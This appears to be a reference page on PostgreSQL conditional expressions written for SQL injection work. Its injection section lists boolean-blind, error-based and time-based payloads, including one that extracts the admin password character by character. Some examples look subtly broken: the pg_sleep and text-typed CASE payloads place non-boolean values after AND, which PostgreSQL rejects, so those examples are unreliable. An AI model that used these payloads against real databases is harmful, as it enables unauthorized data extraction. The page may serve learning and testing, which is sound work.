---
title: Conditional Statements
description: Using conditional logic in PostgreSQL injections
category: Injection Techniques
order: 12
tags: ["conditional", "case", "boolean"]
lastUpdated: 2025-12-07
---

## Conditional Statements

Conditional logic is essential for advanced SQL injection techniques, particularly for boolean-based and time-based blind injection.

### CASE Expression

The primary conditional construct in PostgreSQL:

```sql
SELECT CASE WHEN (condition) THEN 'true_result' ELSE 'false_result' END;
```

Examples:

```sql
-- Simple condition
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;
-- Result: 'A'

-- Multiple conditions
SELECT CASE
    WHEN (SELECT COUNT(*) FROM users) > 100 THEN 'large'
    WHEN (SELECT COUNT(*) FROM users) > 10 THEN 'medium'
    ELSE 'small'
END;
```

### Boolean Type

PostgreSQL has a native boolean type:

```sql
-- Boolean literals
SELECT true, false;
SELECT TRUE, FALSE;

-- Boolean casting
SELECT 'yes'::boolean;  -- true
SELECT 'no'::boolean;   -- false
SELECT 1::boolean;      -- true
SELECT 0::boolean;      -- false
```

### COALESCE() Function

Returns the first non-NULL value:

```sql
SELECT COALESCE(NULL, NULL, 'default');
-- Result: 'default'

SELECT COALESCE(username, 'anonymous') FROM users;
```

### NULLIF() Function

Returns NULL if two values are equal:

```sql
SELECT NULLIF(1, 1);  -- NULL
SELECT NULLIF(1, 2);  -- 1
```

### GREATEST() and LEAST() Functions

```sql
SELECT GREATEST(1, 2, 3);  -- 3
SELECT LEAST(1, 2, 3);     -- 1
```

### Injection Examples

#### Boolean-Based Blind Injection

```sql
-- Test if first character of database name is 'p'
' AND CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN true ELSE false END--

-- Check if user exists
' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN true ELSE false END--

-- Extract data character by character
' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN true ELSE false END FROM users WHERE username='admin')--
```

#### Conditional Error-Based

```sql
-- Force error when condition is true
' AND CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE 'safe' END--

-- Error when user exists
' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN CAST(1/0 AS text) ELSE NULL END--
```

#### Conditional Time-Based

```sql
-- Sleep when condition is true
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Extract data with timing
' AND CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Note:** `pg_sleep()` returns void, not a boolean. The CASE expression exploits the function's side-effect (the delay) rather than any return value. The condition determines which branch executes, and the observable delay reveals whether the condition was true or false.

### Comparing Values

```sql
-- String comparison (case-sensitive)
SELECT CASE WHEN 'Admin' = 'admin' THEN 'match' ELSE 'no match' END;
-- Result: 'no match'

-- Case-insensitive comparison
SELECT CASE WHEN LOWER('Admin') = 'admin' THEN 'match' ELSE 'no match' END;
-- Result: 'match'
```

### Notes

- PostgreSQL uses `CASE WHEN` (not `IF()` like MySQL)
- Boolean operations are native and efficient
- `CASE` expressions can be nested
- Avoid SQL injection by using parameterized queries
